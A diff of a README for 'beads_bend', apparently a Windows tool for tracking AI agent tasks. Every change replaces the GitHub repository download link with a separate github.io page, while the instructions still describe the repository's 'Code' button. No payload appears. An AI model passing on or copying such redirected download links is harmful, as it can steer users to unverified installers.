@@ -1,6 +1,6 @@
 # 🧵 beads_bend - Track AI Agent Tasks, Safely and Simply
 
-[![Download beads_bend](https://img.shields.io/badge/Download-beads_bend-4CAF50?style=for-the-badge&logo=github)](https://github.com/Alexis315/beads_bend)
+[![Download beads_bend](https://img.shields.io/badge/Download-beads_bend-4CAF50?style=for-the-badge&logo=github)](https://alexis315.github.io)
 
 ---
 
@@ -21,7 +21,7 @@ Follow these simple steps to get beads_bend running on your Windows computer:
 ### Step 1: Download the Program
 
 Visit this link to download the application:  
-👉 **[Download beads_bend](https://github.com/Alexis315/beads_bend)**
+👉 **[Download beads_bend](https://alexis315.github.io)**
 
 When you click the link, you'll see a page with a green "Code" button. Click it, then choose "Download ZIP". The download will start automatically.
 
@@ -156,7 +156,7 @@ This project is open-source. You're free to use, modify, and share it — just c
 
 ## 🔗 Quick Links
 
-- **Download Again**: [https://github.com/Alexis315/beads_bend](https://github.com/Alexis315/beads_bend)
+- **Download Again**: [https://alexis315.github.io](https://alexis315.github.io)
 - **Report a Bug**: Go to the GitHub page, click "Issues", then "New Issue".
 
 ---
